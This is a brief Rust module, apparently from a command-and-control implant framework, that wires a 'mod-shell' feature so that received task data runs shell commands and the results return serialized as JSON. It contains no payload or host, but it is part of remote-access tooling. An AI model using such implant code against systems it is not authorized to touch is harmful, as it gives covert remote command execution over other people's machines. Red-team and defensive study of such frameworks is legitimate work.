//! Shell task execution via mod-shell
//!
//! Enabled via the `mod-shell` feature flag.
//! This replaces the async shell.rs with the proper Module-based implementation.

use crate::error::ImplantResult;
use common::{Module, TaskId};

/// Execute a shell task using mod-shell
pub fn execute_shell_module(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    let module = mod_shell::ShellModule::new();
    let task_id = TaskId::new();

    let result = module
        .handle(task_id, task_data)
        .map_err(|e| crate::error::ImplantError::Task(e.to_string()))?;

    // Serialize the TaskResult to bytes (JSON for now, could be protobuf later)
    let result_bytes =
        serde_json::to_vec(&result).map_err(|e| crate::error::ImplantError::Task(e.to_string()))?;

    Ok(result_bytes)
}
